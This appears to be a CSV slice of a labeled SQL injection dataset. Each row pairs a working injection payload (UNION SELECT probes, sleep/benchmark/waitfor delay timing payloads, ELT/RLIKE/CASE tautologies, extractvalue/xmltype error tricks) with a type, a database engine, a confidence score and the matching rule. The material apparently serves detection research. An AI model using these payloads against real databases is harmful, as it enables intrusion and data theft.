id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
18944,"1"" or elt ( 5873 = 5873,sleep ( 5 ) ) #",boolean_blind,mysql,0.95,"Token 'elt (' matched in payload '1"" or elt ( 5873 = 5873,sleep ( 5 ) ) #' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'elt' → mysql; secondary signal 'sleep (' (time_blind P5) overridden by priority",2
18945,1'|| ( select 'bsbv' from dual where 5276 = 5276 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) ) ||',boolean_blind,oracle,0.95,"Token 'where 5276 = 5276' matched in payload '1'|| ( select 'bsbv' from dual where 5276 = 5276 or ( select * from ( select ( s' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'dual' → oracle; secondary signal 'sleep (' (time_blind P5) overridden by priority",2
18946,"1%"" ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ""%"" = """,boolean_blind,mysql,0.95,"Token 'rlike (' matched in payload '1%"" ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ""%"" = ""' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'rlike' → mysql; secondary signal 'sleep (' (time_blind P5) overridden by priority",3
18947,1' ) ) waitfor delay '0:0:5'--,time_blind,mssql,0.90,"Token 'waitfor delay' matched in payload '1' ) ) waitfor delay '0:0:5'--' → time_blind (P5, time delay function); DB signature token 'waitfor delay' → mssql",3
18948,"-8093"" ) ) as oboi where 1476 = 1476 union all select 1476,1476,1476,1476#",boolean_blind,generic,0.85,"Token 'where 1476 = 1476' matched in payload '-8093"" ) ) as oboi where 1476 = 1476 union all select 1476,1476,1476,1476#' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); No exclusive DB signature → generic; secondary signal 'union all select' (union_based P7) overridden by priority",1
18949,"-3703"" ) ) ) union all select 3293,3293,3293,3293,3293,3293,3293,3293,3293,3293#",union_based,generic,0.80,"Token 'union all select' matched in payload '-3703"" ) ) ) union all select 3293,3293,3293,3293,3293,3293,3293,3293,3293,3293#' → union_based (P7, UNION SELECT); No exclusive DB signature → generic",3
18950,"1 ) ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( ( 7813 = 7813",boolean_blind,mysql,0.95,"Token 'case when ( 5840 = 5840 ) then 1 else' matched in payload '1 ) ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( se' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'extractvalue' → mysql; secondary signal 'extractvalue' (error_based P4) overridden by priority",1
18951,"1' in boolean mode ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,0.90,"Token 'dbms_pipe.receive_message' matched in payload '1' in boolean mode ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 8' → time_blind (P5, time delay function); DB signature token 'dbms_pipe' → oracle",3
18952,"-3130 ) union all select 1741,1741,1741,1741,1741,1741,1741,1741#",union_based,generic,0.80,"Token 'union all select' matched in payload '-3130 ) union all select 1741,1741,1741,1741,1741,1741,1741,1741#' → union_based (P7, UNION SELECT); No exclusive DB signature → generic",3
18953,"1 ) ) union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.80,"Token 'union all select' matched in payload '1 ) ) union all select null,null,null,null,null,null,null,null,null--' → union_based (P7, UNION SELECT); No exclusive DB signature → generic",3
18954,"-5528' ) union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#",union_based,generic,0.80,"Token 'union all select' matched in payload '-5528' ) union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#' → union_based (P7, UNION SELECT); No exclusive DB signature → generic",3
18955,"-4589"" ) union all select 1441,1441,1441,1441,1441,1441,1441,1441,1441,1441--",union_based,generic,0.80,"Token 'union all select' matched in payload '-4589"" ) union all select 1441,1441,1441,1441,1441,1441,1441,1441,1441,1441--' → union_based (P7, UNION SELECT); No exclusive DB signature → generic",3
18956,"1 where 7196 = 7196 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) --",boolean_blind,mysql,0.95,"Token 'where 7196 = 7196' matched in payload '1 where 7196 = 7196 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) --' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'benchmark' → mysql; secondary signal 'benchmark (' (time_blind P5) overridden by priority",1
18957,"1 where 6881 = 6881 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) --",boolean_blind,mysql,0.95,"Token 'case when ( 5840 = 5840 ) then 1 else' matched in payload '1 where 6881 = 6881 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'extractvalue' → mysql; secondary signal 'extractvalue' (error_based P4) overridden by priority",1
18958,"-5130' ) ) union all select 5218,5218,5218,5218,5218,5218,5218,5218,5218,5218--",union_based,generic,0.80,"Token 'union all select' matched in payload '-5130' ) ) union all select 5218,5218,5218,5218,5218,5218,5218,5218,5218,5218--' → union_based (P7, UNION SELECT); No exclusive DB signature → generic",3
18959,"-7797'+ ( select oulr where 7091 = 7091 union all select 7091,7091,7091,7091,7091,7091,7091,7091,7091#",boolean_blind,generic,0.85,"Token 'where 7091 = 7091' matched in payload '-7797'+ ( select oulr where 7091 = 7091 union all select 7091,7091,7091,7091,709' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); No exclusive DB signature → generic; secondary signal 'union all select' (union_based P7) overridden by priority",1
18960,"1"" union all select null,null,null,null,null,null,null,null#",union_based,generic,0.80,"Token 'union all select' matched in payload '1"" union all select null,null,null,null,null,null,null,null#' → union_based (P7, UNION SELECT); No exclusive DB signature → generic",3
18961,"1"" ) union all select null,null,null,null--",union_based,generic,0.80,"Token 'union all select' matched in payload '1"" ) union all select null,null,null,null--' → union_based (P7, UNION SELECT); No exclusive DB signature → generic",3
18962,"1"" ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.90,"Token 'benchmark (' matched in payload '1"" ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #' → time_blind (P5, time delay function); DB signature token 'benchmark' → mysql",2
18963,"-9661"" ) ) ) union all select 2158,2158,2158--",union_based,generic,0.80,"Token 'union all select' matched in payload '-9661"" ) ) ) union all select 2158,2158,2158--' → union_based (P7, UNION SELECT); No exclusive DB signature → generic",3
18964,"1%' ) union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.80,"Token 'union all select' matched in payload '1%' ) union all select null,null,null,null,null,null,null,null,null,null--' → union_based (P7, UNION SELECT); No exclusive DB signature → generic",3
18965,"1"" and elt ( 3114 = 3114,sleep ( 5 ) ) #",boolean_blind,mysql,0.95,"Token 'elt (' matched in payload '1"" and elt ( 3114 = 3114,sleep ( 5 ) ) #' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'elt' → mysql; secondary signal 'sleep (' (time_blind P5) overridden by priority",2
18966,begin if ( 5624 = 5624 ) then dbms_lock.sleep ( 5 ),time_blind,oracle,0.90,"Token 'sleep (' matched in payload 'begin if ( 5624 = 5624 ) then dbms_lock.sleep ( 5 )' → time_blind (P5, time delay function); DB signature token 'dbms_lock' → oracle",3
18967,"1 ) where 2044 = 2044 or elt ( 6272 = 6272,sleep ( 5 ) ) --",boolean_blind,mysql,0.95,"Token 'elt (' matched in payload '1 ) where 2044 = 2044 or elt ( 6272 = 6272,sleep ( 5 ) ) --' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'elt' → mysql; secondary signal 'sleep (' (time_blind P5) overridden by priority",3
18968,"1%' and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.90,"Token 'benchmark (' matched in payload '1%' and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #' → time_blind (P5, time delay function); DB signature token 'benchmark' → mysql",2
18969,"-1949 ) as smyn where 4066 = 4066 union all select 4066,4066--",boolean_blind,generic,0.85,"Token 'where 4066 = 4066' matched in payload '-1949 ) as smyn where 4066 = 4066 union all select 4066,4066--' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); No exclusive DB signature → generic; secondary signal 'union all select' (union_based P7) overridden by priority",1
18970,"-4522"" ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ""mbkq"" = ""mbkq",boolean_blind,oracle,0.95,"Token 'case when ( 4144 = 4144 ) then 1 else' matched in payload '-4522"" ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 11' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'xmltype' → oracle; secondary signal 'xmltype' (error_based P4) overridden by priority",2
18971,"-2028' ) ) ) union all select 8698,8698,8698,8698#",union_based,generic,0.80,"Token 'union all select' matched in payload '-2028' ) ) ) union all select 8698,8698,8698,8698#' → union_based (P7, UNION SELECT); No exclusive DB signature → generic",3
18972,"1 union all select null,null,null,null,null--",union_based,generic,0.80,"Token 'union all select' matched in payload '1 union all select null,null,null,null,null--' → union_based (P7, UNION SELECT); No exclusive DB signature → generic",3
18973,"-3852' ) union all select 3577,3577,3577,3577,3577,3577,3577,3577#",union_based,generic,0.80,"Token 'union all select' matched in payload '-3852' ) union all select 3577,3577,3577,3577,3577,3577,3577,3577#' → union_based (P7, UNION SELECT); No exclusive DB signature → generic",3
18974,"1' ) ) as jxvv where 6593 = 6593 or elt ( 6272 = 6272,sleep ( 5 ) ) --",boolean_blind,mysql,0.95,"Token 'elt (' matched in payload '1' ) ) as jxvv where 6593 = 6593 or elt ( 6272 = 6272,sleep ( 5 ) ) --' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'elt' → mysql; secondary signal 'sleep (' (time_blind P5) overridden by priority",3
18975,"1 ) where 5232 = 5232 union all select null,null,null#",boolean_blind,generic,0.85,"Token 'where 5232 = 5232' matched in payload '1 ) where 5232 = 5232 union all select null,null,null#' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); No exclusive DB signature → generic; secondary signal 'union all select' (union_based P7) overridden by priority",1
18976,"-8943%' ) union all select 7710,7710#",union_based,generic,0.80,"Token 'union all select' matched in payload '-8943%' ) union all select 7710,7710#' → union_based (P7, UNION SELECT); No exclusive DB signature → generic",3
18977,"1%' union all select null,null,null,null,null--",union_based,generic,0.80,"Token 'union all select' matched in payload '1%' union all select null,null,null,null,null--' → union_based (P7, UNION SELECT); No exclusive DB signature → generic",3
